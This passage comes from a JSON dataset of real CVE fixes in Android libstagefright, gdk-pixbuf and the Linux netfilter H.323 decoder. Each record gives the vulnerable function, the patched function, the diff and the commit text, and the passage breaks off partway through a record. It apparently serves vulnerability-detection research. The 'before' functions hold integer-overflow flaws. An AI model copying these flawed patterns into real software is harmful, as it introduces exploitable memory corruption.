        "func": "status_t addVorbisCodecInfo(\n        const sp<MetaData> &meta,\n        const void *_codecPrivate, size_t codecPrivateSize) {\n    // hexdump(_codecPrivate, codecPrivateSize);\n\n    if (codecPrivateSize < 1) {\n        return ERROR_MALFORMED;\n    }\n\n    const uint8_t *codecPrivate = (const uint8_t *)_codecPrivate;\n\n    if (codecPrivate[0] != 0x02) {\n        return ERROR_MALFORMED;\n    }\n\n    // codecInfo starts with two lengths, len1 and len2, that are\n    // \"Xiph-style-lacing encoded\"...\n\n    size_t offset = 1;\n    size_t len1 = 0;\n    while (offset < codecPrivateSize && codecPrivate[offset] == 0xff) {\n        if (len1 > (SIZE_MAX - 0xff)) {\n            return ERROR_MALFORMED; // would overflow\n        }\n        len1 += 0xff;\n        ++offset;\n    }\n    if (offset >= codecPrivateSize) {\n        return ERROR_MALFORMED;\n    }\n    if (len1 > (SIZE_MAX - codecPrivate[offset])) {\n        return ERROR_MALFORMED; // would overflow\n    }\n    len1 += codecPrivate[offset++];\n\n    size_t len2 = 0;\n    while (offset < codecPrivateSize && codecPrivate[offset] == 0xff) {\n        if (len2 > (SIZE_MAX - 0xff)) {\n            return ERROR_MALFORMED; // would overflow\n        }\n        len2 += 0xff;\n        ++offset;\n    }\n    if (offset >= codecPrivateSize) {\n        return ERROR_MALFORMED;\n    }\n    if (len2 > (SIZE_MAX - codecPrivate[offset])) {\n        return ERROR_MALFORMED; // would overflow\n    }\n    len2 += codecPrivate[offset++];\n\n    if (len1 > SIZE_MAX - len2 || offset > SIZE_MAX - (len1 + len2) ||\n            codecPrivateSize < offset + len1 + len2) {\n        return ERROR_MALFORMED;\n    }\n\n    if (codecPrivate[offset] != 0x01) {\n        return ERROR_MALFORMED;\n    }\n    meta->setData(kKeyVorbisInfo, 0, &codecPrivate[offset], len1);\n\n    offset += len1;\n    if (codecPrivate[offset] != 0x03) {\n        return ERROR_MALFORMED;\n    }\n\n    offset += len2;\n    if (codecPrivate[offset] != 0x05) {\n        return ERROR_MALFORMED;\n    }\n\n    meta->setData(\n            kKeyVorbisBooks, 0, &codecPrivate[offset],\n            codecPrivateSize - offset);\n\n    return OK;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -19,25 +19,38 @@\n     size_t offset = 1;\n     size_t len1 = 0;\n     while (offset < codecPrivateSize && codecPrivate[offset] == 0xff) {\n+        if (len1 > (SIZE_MAX - 0xff)) {\n+            return ERROR_MALFORMED; // would overflow\n+        }\n         len1 += 0xff;\n         ++offset;\n     }\n     if (offset >= codecPrivateSize) {\n         return ERROR_MALFORMED;\n     }\n+    if (len1 > (SIZE_MAX - codecPrivate[offset])) {\n+        return ERROR_MALFORMED; // would overflow\n+    }\n     len1 += codecPrivate[offset++];\n \n     size_t len2 = 0;\n     while (offset < codecPrivateSize && codecPrivate[offset] == 0xff) {\n+        if (len2 > (SIZE_MAX - 0xff)) {\n+            return ERROR_MALFORMED; // would overflow\n+        }\n         len2 += 0xff;\n         ++offset;\n     }\n     if (offset >= codecPrivateSize) {\n         return ERROR_MALFORMED;\n     }\n+    if (len2 > (SIZE_MAX - codecPrivate[offset])) {\n+        return ERROR_MALFORMED; // would overflow\n+    }\n     len2 += codecPrivate[offset++];\n \n-    if (codecPrivateSize < offset + len1 + len2) {\n+    if (len1 > SIZE_MAX - len2 || offset > SIZE_MAX - (len1 + len2) ||\n+            codecPrivateSize < offset + len1 + len2) {\n         return ERROR_MALFORMED;\n     }\n ",
        "diff_line_info": {
            "deleted_lines": [
                "    if (codecPrivateSize < offset + len1 + len2) {"
            ],
            "added_lines": [
                "        if (len1 > (SIZE_MAX - 0xff)) {",
                "            return ERROR_MALFORMED; // would overflow",
                "        }",
                "    if (len1 > (SIZE_MAX - codecPrivate[offset])) {",
                "        return ERROR_MALFORMED; // would overflow",
                "    }",
                "        if (len2 > (SIZE_MAX - 0xff)) {",
                "            return ERROR_MALFORMED; // would overflow",
                "        }",
                "    if (len2 > (SIZE_MAX - codecPrivate[offset])) {",
                "        return ERROR_MALFORMED; // would overflow",
                "    }",
                "    if (len1 > SIZE_MAX - len2 || offset > SIZE_MAX - (len1 + len2) ||",
                "            codecPrivateSize < offset + len1 + len2) {"
            ]
        }
    },
    {
        "cve_id": "CVE-2015-6575",
        "func_name": "android/SampleTable::setCompositionTimeToSampleParams",
        "description": "SampleTable.cpp in libstagefright in Android before 5.1.1 LMY48I does not properly consider integer promotion, which allows remote attackers to execute arbitrary code or cause a denial of service (integer overflow and memory corruption) via crafted atoms in MP4 data, aka internal bug 20139950, a different vulnerability than CVE-2015-1538. NOTE: this vulnerability exists because of an incomplete fix for CVE-2014-7915, CVE-2014-7916, and/or CVE-2014-7917.",
        "git_url": "https://android.googlesource.com/platform/frameworks/av/+/cf1581c66c2ad8c5b1aaca2e43e350cf5974f46d",
        "commit_title": "Fix several ineffective integer overflow checks",
        "commit_text": " Commit edd4a76 (which addressed bugs 15328708, 15342615, 15342751) added several integer overflow checks. Unfortunately, those checks fail to take into account integer promotion rules and are thus themselves subject to an integer overflow. Cast the sizeof() operator to a uint64_t to force promotion while multiplying.  Bug: 20139950  (cherry picked from commit e2e812e58e8d2716b00d7d82db99b08d3afb4b32)  ",
        "func_before": "status_t SampleTable::setCompositionTimeToSampleParams(\n        off64_t data_offset, size_t data_size) {\n    ALOGI(\"There are reordered frames present.\");\n\n    if (mCompositionTimeDeltaEntries != NULL || data_size < 8) {\n        return ERROR_MALFORMED;\n    }\n\n    uint8_t header[8];\n    if (mDataSource->readAt(\n                data_offset, header, sizeof(header))\n            < (ssize_t)sizeof(header)) {\n        return ERROR_IO;\n    }\n\n    if (U32_AT(header) != 0) {\n        // Expected version = 0, flags = 0.\n        return ERROR_MALFORMED;\n    }\n\n    size_t numEntries = U32_AT(&header[4]);\n\n    if (data_size != (numEntries + 1) * 8) {\n        return ERROR_MALFORMED;\n    }\n\n    mNumCompositionTimeDeltaEntries = numEntries;\n    uint64_t allocSize = numEntries * 2 * sizeof(uint32_t);\n    if (allocSize > SIZE_MAX) {\n        return ERROR_OUT_OF_RANGE;\n    }\n\n    mCompositionTimeDeltaEntries = new uint32_t[2 * numEntries];\n\n    if (mDataSource->readAt(\n                data_offset + 8, mCompositionTimeDeltaEntries, numEntries * 8)\n            < (ssize_t)numEntries * 8) {\n        delete[] mCompositionTimeDeltaEntries;\n        mCompositionTimeDeltaEntries = NULL;\n\n        return ERROR_IO;\n    }\n\n    for (size_t i = 0; i < 2 * numEntries; ++i) {\n        mCompositionTimeDeltaEntries[i] = ntohl(mCompositionTimeDeltaEntries[i]);\n    }\n\n    mCompositionDeltaLookup->setEntries(\n            mCompositionTimeDeltaEntries, mNumCompositionTimeDeltaEntries);\n\n    return OK;\n}",
        "func": "status_t SampleTable::setCompositionTimeToSampleParams(\n        off64_t data_offset, size_t data_size) {\n    ALOGI(\"There are reordered frames present.\");\n\n    if (mCompositionTimeDeltaEntries != NULL || data_size < 8) {\n        return ERROR_MALFORMED;\n    }\n\n    uint8_t header[8];\n    if (mDataSource->readAt(\n                data_offset, header, sizeof(header))\n            < (ssize_t)sizeof(header)) {\n        return ERROR_IO;\n    }\n\n    if (U32_AT(header) != 0) {\n        // Expected version = 0, flags = 0.\n        return ERROR_MALFORMED;\n    }\n\n    size_t numEntries = U32_AT(&header[4]);\n\n    if (data_size != (numEntries + 1) * 8) {\n        return ERROR_MALFORMED;\n    }\n\n    mNumCompositionTimeDeltaEntries = numEntries;\n    uint64_t allocSize = numEntries * 2 * (uint64_t)sizeof(uint32_t);\n    if (allocSize > SIZE_MAX) {\n        return ERROR_OUT_OF_RANGE;\n    }\n\n    mCompositionTimeDeltaEntries = new uint32_t[2 * numEntries];\n\n    if (mDataSource->readAt(\n                data_offset + 8, mCompositionTimeDeltaEntries, numEntries * 8)\n            < (ssize_t)numEntries * 8) {\n        delete[] mCompositionTimeDeltaEntries;\n        mCompositionTimeDeltaEntries = NULL;\n\n        return ERROR_IO;\n    }\n\n    for (size_t i = 0; i < 2 * numEntries; ++i) {\n        mCompositionTimeDeltaEntries[i] = ntohl(mCompositionTimeDeltaEntries[i]);\n    }\n\n    mCompositionDeltaLookup->setEntries(\n            mCompositionTimeDeltaEntries, mNumCompositionTimeDeltaEntries);\n\n    return OK;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -25,7 +25,7 @@\n     }\n \n     mNumCompositionTimeDeltaEntries = numEntries;\n-    uint64_t allocSize = numEntries * 2 * sizeof(uint32_t);\n+    uint64_t allocSize = numEntries * 2 * (uint64_t)sizeof(uint32_t);\n     if (allocSize > SIZE_MAX) {\n         return ERROR_OUT_OF_RANGE;\n     }",
        "diff_line_info": {
            "deleted_lines": [
                "    uint64_t allocSize = numEntries * 2 * sizeof(uint32_t);"
            ],
            "added_lines": [
                "    uint64_t allocSize = numEntries * 2 * (uint64_t)sizeof(uint32_t);"
            ]
        }
    },
    {
        "cve_id": "CVE-2015-6575",
        "func_name": "android/SampleTable::setTimeToSampleParams",
        "description": "SampleTable.cpp in libstagefright in Android before 5.1.1 LMY48I does not properly consider integer promotion, which allows remote attackers to execute arbitrary code or cause a denial of service (integer overflow and memory corruption) via crafted atoms in MP4 data, aka internal bug 20139950, a different vulnerability than CVE-2015-1538. NOTE: this vulnerability exists because of an incomplete fix for CVE-2014-7915, CVE-2014-7916, and/or CVE-2014-7917.",
        "git_url": "https://android.googlesource.com/platform/frameworks/av/+/cf1581c66c2ad8c5b1aaca2e43e350cf5974f46d",
        "commit_title": "Fix several ineffective integer overflow checks",
        "commit_text": " Commit edd4a76 (which addressed bugs 15328708, 15342615, 15342751) added several integer overflow checks. Unfortunately, those checks fail to take into account integer promotion rules and are thus themselves subject to an integer overflow. Cast the sizeof() operator to a uint64_t to force promotion while multiplying.  Bug: 20139950  (cherry picked from commit e2e812e58e8d2716b00d7d82db99b08d3afb4b32)  ",
        "func_before": "status_t SampleTable::setTimeToSampleParams(\n        off64_t data_offset, size_t data_size) {\n    if (mTimeToSample != NULL || data_size < 8) {\n        return ERROR_MALFORMED;\n    }\n\n    uint8_t header[8];\n    if (mDataSource->readAt(\n                data_offset, header, sizeof(header)) < (ssize_t)sizeof(header)) {\n        return ERROR_IO;\n    }\n\n    if (U32_AT(header) != 0) {\n        // Expected version = 0, flags = 0.\n        return ERROR_MALFORMED;\n    }\n\n    mTimeToSampleCount = U32_AT(&header[4]);\n    uint64_t allocSize = mTimeToSampleCount * 2 * sizeof(uint32_t);\n    if (allocSize > SIZE_MAX) {\n        return ERROR_OUT_OF_RANGE;\n    }\n    mTimeToSample = new uint32_t[mTimeToSampleCount * 2];\n\n    size_t size = sizeof(uint32_t) * mTimeToSampleCount * 2;\n    if (mDataSource->readAt(\n                data_offset + 8, mTimeToSample, size) < (ssize_t)size) {\n        return ERROR_IO;\n    }\n\n    for (uint32_t i = 0; i < mTimeToSampleCount * 2; ++i) {\n        mTimeToSample[i] = ntohl(mTimeToSample[i]);\n    }\n\n    return OK;\n}",
        "func": "status_t SampleTable::setTimeToSampleParams(\n        off64_t data_offset, size_t data_size) {\n    if (mTimeToSample != NULL || data_size < 8) {\n        return ERROR_MALFORMED;\n    }\n\n    uint8_t header[8];\n    if (mDataSource->readAt(\n                data_offset, header, sizeof(header)) < (ssize_t)sizeof(header)) {\n        return ERROR_IO;\n    }\n\n    if (U32_AT(header) != 0) {\n        // Expected version = 0, flags = 0.\n        return ERROR_MALFORMED;\n    }\n\n    mTimeToSampleCount = U32_AT(&header[4]);\n    uint64_t allocSize = mTimeToSampleCount * 2 * (uint64_t)sizeof(uint32_t);\n    if (allocSize > SIZE_MAX) {\n        return ERROR_OUT_OF_RANGE;\n    }\n    mTimeToSample = new uint32_t[mTimeToSampleCount * 2];\n\n    size_t size = sizeof(uint32_t) * mTimeToSampleCount * 2;\n    if (mDataSource->readAt(\n                data_offset + 8, mTimeToSample, size) < (ssize_t)size) {\n        return ERROR_IO;\n    }\n\n    for (uint32_t i = 0; i < mTimeToSampleCount * 2; ++i) {\n        mTimeToSample[i] = ntohl(mTimeToSample[i]);\n    }\n\n    return OK;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -16,7 +16,7 @@\n     }\n \n     mTimeToSampleCount = U32_AT(&header[4]);\n-    uint64_t allocSize = mTimeToSampleCount * 2 * sizeof(uint32_t);\n+    uint64_t allocSize = mTimeToSampleCount * 2 * (uint64_t)sizeof(uint32_t);\n     if (allocSize > SIZE_MAX) {\n         return ERROR_OUT_OF_RANGE;\n     }",
        "diff_line_info": {
            "deleted_lines": [
                "    uint64_t allocSize = mTimeToSampleCount * 2 * sizeof(uint32_t);"
            ],
            "added_lines": [
                "    uint64_t allocSize = mTimeToSampleCount * 2 * (uint64_t)sizeof(uint32_t);"
            ]
        }
    },
    {
        "cve_id": "CVE-2015-6575",
        "func_name": "android/SampleTable::setSyncSampleParams",
        "description": "SampleTable.cpp in libstagefright in Android before 5.1.1 LMY48I does not properly consider integer promotion, which allows remote attackers to execute arbitrary code or cause a denial of service (integer overflow and memory corruption) via crafted atoms in MP4 data, aka internal bug 20139950, a different vulnerability than CVE-2015-1538. NOTE: this vulnerability exists because of an incomplete fix for CVE-2014-7915, CVE-2014-7916, and/or CVE-2014-7917.",
        "git_url": "https://android.googlesource.com/platform/frameworks/av/+/cf1581c66c2ad8c5b1aaca2e43e350cf5974f46d",
        "commit_title": "Fix several ineffective integer overflow checks",
        "commit_text": " Commit edd4a76 (which addressed bugs 15328708, 15342615, 15342751) added several integer overflow checks. Unfortunately, those checks fail to take into account integer promotion rules and are thus themselves subject to an integer overflow. Cast the sizeof() operator to a uint64_t to force promotion while multiplying.  Bug: 20139950  (cherry picked from commit e2e812e58e8d2716b00d7d82db99b08d3afb4b32)  ",
        "func_before": "status_t SampleTable::setSyncSampleParams(off64_t data_offset, size_t data_size) {\n    if (mSyncSampleOffset >= 0 || data_size < 8) {\n        return ERROR_MALFORMED;\n    }\n\n    mSyncSampleOffset = data_offset;\n\n    uint8_t header[8];\n    if (mDataSource->readAt(\n                data_offset, header, sizeof(header)) < (ssize_t)sizeof(header)) {\n        return ERROR_IO;\n    }\n\n    if (U32_AT(header) != 0) {\n        // Expected version = 0, flags = 0.\n        return ERROR_MALFORMED;\n    }\n\n    mNumSyncSamples = U32_AT(&header[4]);\n\n    if (mNumSyncSamples < 2) {\n        ALOGV(\"Table of sync samples is empty or has only a single entry!\");\n    }\n\n    uint64_t allocSize = mNumSyncSamples * sizeof(uint32_t);\n    if (allocSize > SIZE_MAX) {\n        return ERROR_OUT_OF_RANGE;\n    }\n\n    mSyncSamples = new uint32_t[mNumSyncSamples];\n    size_t size = mNumSyncSamples * sizeof(uint32_t);\n    if (mDataSource->readAt(mSyncSampleOffset + 8, mSyncSamples, size)\n            != (ssize_t)size) {\n        return ERROR_IO;\n    }\n\n    for (size_t i = 0; i < mNumSyncSamples; ++i) {\n        mSyncSamples[i] = ntohl(mSyncSamples[i]) - 1;\n    }\n\n    return OK;\n}",
        "func": "status_t SampleTable::setSyncSampleParams(off64_t data_offset, size_t data_size) {\n    if (mSyncSampleOffset >= 0 || data_size < 8) {\n        return ERROR_MALFORMED;\n    }\n\n    mSyncSampleOffset = data_offset;\n\n    uint8_t header[8];\n    if (mDataSource->readAt(\n                data_offset, header, sizeof(header)) < (ssize_t)sizeof(header)) {\n        return ERROR_IO;\n    }\n\n    if (U32_AT(header) != 0) {\n        // Expected version = 0, flags = 0.\n        return ERROR_MALFORMED;\n    }\n\n    mNumSyncSamples = U32_AT(&header[4]);\n\n    if (mNumSyncSamples < 2) {\n        ALOGV(\"Table of sync samples is empty or has only a single entry!\");\n    }\n\n    uint64_t allocSize = mNumSyncSamples * (uint64_t)sizeof(uint32_t);\n    if (allocSize > SIZE_MAX) {\n        return ERROR_OUT_OF_RANGE;\n    }\n\n    mSyncSamples = new uint32_t[mNumSyncSamples];\n    size_t size = mNumSyncSamples * sizeof(uint32_t);\n    if (mDataSource->readAt(mSyncSampleOffset + 8, mSyncSamples, size)\n            != (ssize_t)size) {\n        return ERROR_IO;\n    }\n\n    for (size_t i = 0; i < mNumSyncSamples; ++i) {\n        mSyncSamples[i] = ntohl(mSyncSamples[i]) - 1;\n    }\n\n    return OK;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -22,7 +22,7 @@\n         ALOGV(\"Table of sync samples is empty or has only a single entry!\");\n     }\n \n-    uint64_t allocSize = mNumSyncSamples * sizeof(uint32_t);\n+    uint64_t allocSize = mNumSyncSamples * (uint64_t)sizeof(uint32_t);\n     if (allocSize > SIZE_MAX) {\n         return ERROR_OUT_OF_RANGE;\n     }",
        "diff_line_info": {
            "deleted_lines": [
                "    uint64_t allocSize = mNumSyncSamples * sizeof(uint32_t);"
            ],
            "added_lines": [
                "    uint64_t allocSize = mNumSyncSamples * (uint64_t)sizeof(uint32_t);"
            ]
        }
    },
    {
        "cve_id": "CVE-2015-7674",
        "func_name": "GNOME/gdk-pixbuf/pixops_scale_nearest",
        "description": "Integer overflow in the pixops_scale_nearest function in pixops/pixops.c in gdk-pixbuf before 2.32.1 allows remote attackers to cause a denial of service (application crash) and possibly execute arbitrary code via a crafted GIF image file, which triggers a heap-based buffer overflow.",
        "git_url": "https://github.com/GNOME/gdk-pixbuf/commit/e9a5704edaa9aee9498f1fbf6e1b70fcce2e55aa",
        "commit_title": "pixops: Don't overflow variables when shifting them",
        "commit_text": " If we shift by 16 bits we need to be sure those 16 bits actually exist. They do now.",
        "func_before": "static void\npixops_scale_nearest (guchar        *dest_buf,\n\t\t      int            render_x0,\n\t\t      int            render_y0,\n\t\t      int            render_x1,\n\t\t      int            render_y1,\n\t\t      int            dest_rowstride,\n\t\t      int            dest_channels,\n\t\t      gboolean       dest_has_alpha,\n\t\t      const guchar  *src_buf,\n\t\t      int            src_width,\n\t\t      int            src_height,\n\t\t      int            src_rowstride,\n\t\t      int            src_channels,\n\t\t      gboolean       src_has_alpha,\n\t\t      double         scale_x,\n\t\t      double         scale_y)\n{\n  int i;\n  int x;\n  int x_step = (1 << SCALE_SHIFT) / scale_x;\n  int y_step = (1 << SCALE_SHIFT) / scale_y;\n  int xmax, xstart, xstop, x_pos, y_pos;\n  const guchar *p;\n\n#define INNER_LOOP(SRC_CHANNELS,DEST_CHANNELS,ASSIGN_PIXEL)     \\\n      xmax = x + (render_x1 - render_x0) * x_step;              \\\n      xstart = MIN (0, xmax);                                   \\\n      xstop = MIN (src_width << SCALE_SHIFT, xmax);             \\\n      p = src + (CLAMP (x, xstart, xstop) >> SCALE_SHIFT) * SRC_CHANNELS; \\\n      while (x < xstart)                                        \\\n        {                                                       \\\n          ASSIGN_PIXEL;                                         \\\n          dest += DEST_CHANNELS;                                \\\n          x += x_step;                                          \\\n        }                                                       \\\n      while (x < xstop)                                         \\\n        {                                                       \\\n          p = src + (x >> SCALE_SHIFT) * SRC_CHANNELS;          \\\n          ASSIGN_PIXEL;                                         \\\n          dest += DEST_CHANNELS;                                \\\n          x += x_step;                                          \\\n        }                                                       \\\n      x_pos = x >> SCALE_SHIFT;                                 \\\n      p = src + CLAMP (x_pos, 0, src_width - 1) * SRC_CHANNELS; \\\n      while (x < xmax)                                          \\\n        {                                                       \\\n          ASSIGN_PIXEL;                                         \\\n          dest += DEST_CHANNELS;                                \\\n          x += x_step;                                          \\\n        }\n\n  for (i = 0; i < (render_y1 - render_y0); i++)\n    {\n      const guchar *src;\n      guchar       *dest;\n      y_pos = ((i + render_y0) * y_step + y_step / 2) >> SCALE_SHIFT;\n      y_pos = CLAMP (y_pos, 0, src_height - 1);\n      src  = src_buf + (gsize)y_pos * src_rowstride;\n      dest = dest_buf + (gsize)i * dest_rowstride;\n\n      x = render_x0 * x_step + x_step / 2;\n\n      if (src_channels == 3)\n\t{\n\t  if (dest_channels == 3)\n\t    {\n\t      INNER_LOOP (3, 3, dest[0]=p[0];dest[1]=p[1];dest[2]=p[2]);\n\t    }\n\t  else\n\t    {\n\t      INNER_LOOP (3, 4, dest[0]=p[0];dest[1]=p[1];dest[2]=p[2];dest[3]=0xff);\n\t    }\n\t}\n      else if (src_channels == 4)\n\t{\n\t  if (dest_channels == 3)\n\t    {\n\t      INNER_LOOP (4, 3, dest[0]=p[0];dest[1]=p[1];dest[2]=p[2]);\n\t    }\n\t  else\n\t    {\n\t      guint32 *p32;\n\t      INNER_LOOP(4, 4, p32=(guint32*)dest;*p32=*((guint32*)p));\n\t    }\n\t}\n    }\n}",
        "func": "static void\npixops_scale_nearest (guchar        *dest_buf,\n\t\t      int            render_x0,\n\t\t      int            render_y0,\n\t\t      int            render_x1,\n\t\t      int            render_y1,\n\t\t      int            dest_rowstride,\n\t\t      int            dest_channels,\n\t\t      gboolean       dest_has_alpha,\n\t\t      const guchar  *src_buf,\n\t\t      int            src_width,\n\t\t      int            src_height,\n\t\t      int            src_rowstride,\n\t\t      int            src_channels,\n\t\t      gboolean       src_has_alpha,\n\t\t      double         scale_x,\n\t\t      double         scale_y)\n{\n  gint64 i;\n  gint64 x;\n  gint64 x_step = (1 << SCALE_SHIFT) / scale_x;\n  gint64 y_step = (1 << SCALE_SHIFT) / scale_y;\n  gint64 xmax, xstart, xstop, x_pos, y_pos;\n  const guchar *p;\n\n#define INNER_LOOP(SRC_CHANNELS,DEST_CHANNELS,ASSIGN_PIXEL)     \\\n      xmax = x + (render_x1 - render_x0) * x_step;              \\\n      xstart = MIN (0, xmax);                                   \\\n      xstop = MIN (src_width << SCALE_SHIFT, xmax);             \\\n      p = src + (CLAMP (x, xstart, xstop) >> SCALE_SHIFT) * SRC_CHANNELS; \\\n      while (x < xstart)                                        \\\n        {                                                       \\\n          ASSIGN_PIXEL;                                         \\\n          dest += DEST_CHANNELS;                                \\\n          x += x_step;                                          \\\n        }                                                       \\\n      while (x < xstop)                                         \\\n        {                                                       \\\n          p = src + (x >> SCALE_SHIFT) * SRC_CHANNELS;          \\\n          ASSIGN_PIXEL;                                         \\\n          dest += DEST_CHANNELS;                                \\\n          x += x_step;                                          \\\n        }                                                       \\\n      x_pos = x >> SCALE_SHIFT;                                 \\\n      p = src + CLAMP (x_pos, 0, src_width - 1) * SRC_CHANNELS; \\\n      while (x < xmax)                                          \\\n        {                                                       \\\n          ASSIGN_PIXEL;                                         \\\n          dest += DEST_CHANNELS;                                \\\n          x += x_step;                                          \\\n        }\n\n  for (i = 0; i < (render_y1 - render_y0); i++)\n    {\n      const guchar *src;\n      guchar       *dest;\n      y_pos = ((i + render_y0) * y_step + y_step / 2) >> SCALE_SHIFT;\n      y_pos = CLAMP (y_pos, 0, src_height - 1);\n      src  = src_buf + (gsize)y_pos * src_rowstride;\n      dest = dest_buf + (gsize)i * dest_rowstride;\n\n      x = render_x0 * x_step + x_step / 2;\n\n      if (src_channels == 3)\n\t{\n\t  if (dest_channels == 3)\n\t    {\n\t      INNER_LOOP (3, 3, dest[0]=p[0];dest[1]=p[1];dest[2]=p[2]);\n\t    }\n\t  else\n\t    {\n\t      INNER_LOOP (3, 4, dest[0]=p[0];dest[1]=p[1];dest[2]=p[2];dest[3]=0xff);\n\t    }\n\t}\n      else if (src_channels == 4)\n\t{\n\t  if (dest_channels == 3)\n\t    {\n\t      INNER_LOOP (4, 3, dest[0]=p[0];dest[1]=p[1];dest[2]=p[2]);\n\t    }\n\t  else\n\t    {\n\t      guint32 *p32;\n\t      INNER_LOOP(4, 4, p32=(guint32*)dest;*p32=*((guint32*)p));\n\t    }\n\t}\n    }\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -16,11 +16,11 @@\n \t\t      double         scale_x,\n \t\t      double         scale_y)\n {\n-  int i;\n-  int x;\n-  int x_step = (1 << SCALE_SHIFT) / scale_x;\n-  int y_step = (1 << SCALE_SHIFT) / scale_y;\n-  int xmax, xstart, xstop, x_pos, y_pos;\n+  gint64 i;\n+  gint64 x;\n+  gint64 x_step = (1 << SCALE_SHIFT) / scale_x;\n+  gint64 y_step = (1 << SCALE_SHIFT) / scale_y;\n+  gint64 xmax, xstart, xstop, x_pos, y_pos;\n   const guchar *p;\n \n #define INNER_LOOP(SRC_CHANNELS,DEST_CHANNELS,ASSIGN_PIXEL)     \\",
        "diff_line_info": {
            "deleted_lines": [
                "  int i;",
                "  int x;",
                "  int x_step = (1 << SCALE_SHIFT) / scale_x;",
                "  int y_step = (1 << SCALE_SHIFT) / scale_y;",
                "  int xmax, xstart, xstop, x_pos, y_pos;"
            ],
            "added_lines": [
                "  gint64 i;",
                "  gint64 x;",
                "  gint64 x_step = (1 << SCALE_SHIFT) / scale_x;",
                "  gint64 y_step = (1 << SCALE_SHIFT) / scale_y;",
                "  gint64 xmax, xstart, xstop, x_pos, y_pos;"
            ]
        }
    },
    {
        "cve_id": "CVE-2007-3642",
        "func_name": "torvalds/linux/decode_seq",
        "description": "The decode_choice function in net/netfilter/nf_conntrack_h323_asn1.c in the Linux kernel before 2.6.20.15, 2.6.21.x before 2.6.21.6, and before 2.6.22 allows remote attackers to cause a denial of service (crash) via an encoded, out-of-range index value for a choice field, which triggers a NULL pointer dereference.",
        "git_url": "http://git.kernel.org/?p=linux/kernel/git/torvalds/linux.git;a=commit;h=25845b5155b55cd77e42655ec24161ba3feffa47",
        "commit_title": "Choices' index values may be out of range while still encoded in the fixed",
        "commit_text": "length bit-field. This bug may cause access to undefined types (NULL pointers) and thus crashes (Reported by Zhongling Wen).  This patch also adds checking of decode flag when decoding SEQUENCEs.  ",
        "func_before": "int decode_seq(bitstr_t * bs, field_t * f, char *base, int level)\n{\n\tunsigned ext, bmp, i, opt, len = 0, bmp2, bmp2_len;\n\tint err;\n\tfield_t *son;\n\tunsigned char *beg = NULL;\n\n\tPRINT(\"%*.s%s\\n\", level * TAB_SIZE, \" \", f->name);\n\n\t/* Decode? */\n\tbase = (base && (f->attr & DECODE)) ? base + f->offset : NULL;\n\n\t/* Extensible? */\n\text = (f->attr & EXT) ? get_bit(bs) : 0;\n\n\t/* Get fields bitmap */\n\tbmp = get_bitmap(bs, f->sz);\n\tif (base)\n\t\t*(unsigned *) base = bmp;\n\n\t/* Decode the root components */\n\tfor (i = opt = 0, son = f->fields; i < f->lb; i++, son++) {\n\t\tif (son->attr & STOP) {\n\t\t\tPRINT(\"%*.s%s\\n\", (level + 1) * TAB_SIZE, \" \",\n\t\t\t      son->name);\n\t\t\treturn H323_ERROR_STOP;\n\t\t}\n\n\t\tif (son->attr & OPT) {\t/* Optional component */\n\t\t\tif (!((0x80000000U >> (opt++)) & bmp))\t/* Not exist */\n\t\t\t\tcontinue;\n\t\t}\n\n\t\t/* Decode */\n\t\tif (son->attr & OPEN) {\t/* Open field */\n\t\t\tCHECK_BOUND(bs, 2);\n\t\t\tlen = get_len(bs);\n\t\t\tCHECK_BOUND(bs, len);\n\t\t\tif (!base) {\n\t\t\t\tPRINT(\"%*.s%s\\n\", (level + 1) * TAB_SIZE,\n\t\t\t\t      \" \", son->name);\n\t\t\t\tbs->cur += len;\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\tbeg = bs->cur;\n\n\t\t\t/* Decode */\n\t\t\tif ((err = (Decoders[son->type]) (bs, son, base,\n\t\t\t\t\t\t\t  level + 1)) <\n\t\t\t    H323_ERROR_NONE)\n\t\t\t\treturn err;\n\n\t\t\tbs->cur = beg + len;\n\t\t\tbs->bit = 0;\n\t\t} else if ((err = (Decoders[son->type]) (bs, son, base,\n\t\t\t\t\t\t\t level + 1)) <\n\t\t\t   H323_ERROR_NONE)\n\t\t\treturn err;\n\t}\n\n\t/* No extension? */\n\tif (!ext)\n\t\treturn H323_ERROR_NONE;\n\n\t/* Get the extension bitmap */\n\tbmp2_len = get_bits(bs, 7) + 1;\n\tCHECK_BOUND(bs, (bmp2_len + 7) >> 3);\n\tbmp2 = get_bitmap(bs, bmp2_len);\n\tbmp |= bmp2 >> f->sz;\n\tif (base)\n\t\t*(unsigned *) base = bmp;\n\tBYTE_ALIGN(bs);\n\n\t/* Decode the extension components */\n\tfor (opt = 0; opt < bmp2_len; opt++, i++, son++) {\n\t\tif (i < f->ub && son->attr & STOP) {\n\t\t\tPRINT(\"%*.s%s\\n\", (level + 1) * TAB_SIZE, \" \",\n\t\t\t      son->name);\n\t\t\treturn H323_ERROR_STOP;\n\t\t}\n\n\t\tif (!((0x80000000 >> opt) & bmp2))\t/* Not present */\n\t\t\tcontinue;\n\n\t\t/* Check Range */\n\t\tif (i >= f->ub) {\t/* Newer Version? */\n\t\t\tCHECK_BOUND(bs, 2);\n\t\t\tlen = get_len(bs);\n\t\t\tCHECK_BOUND(bs, len);\n\t\t\tbs->cur += len;\n\t\t\tcontinue;\n\t\t}\n\n\t\tCHECK_BOUND(bs, 2);\n\t\tlen = get_len(bs);\n\t\tCHECK_BOUND(bs, len);\n\t\tif (!base || !(son->attr & DECODE)) {\n\t\t\tPRINT(\"%*.s%s\\n\", (level + 1) * TAB_SIZE, \" \",\n\t\t\t      son->name);\n\t\t\tbs->cur += len;\n\t\t\tcontinue;\n\t\t}\n\t\tbeg = bs->cur;\n\n\t\tif ((err = (Decoders[son->type]) (bs, son, base,\n\t\t\t\t\t\t  level + 1)) <\n\t\t    H323_ERROR_NONE)\n\t\t\treturn err;\n\n\t\tbs->cur = beg + len;\n\t\tbs->bit = 0;\n\t}\n\treturn H323_ERROR_NONE;\n}",
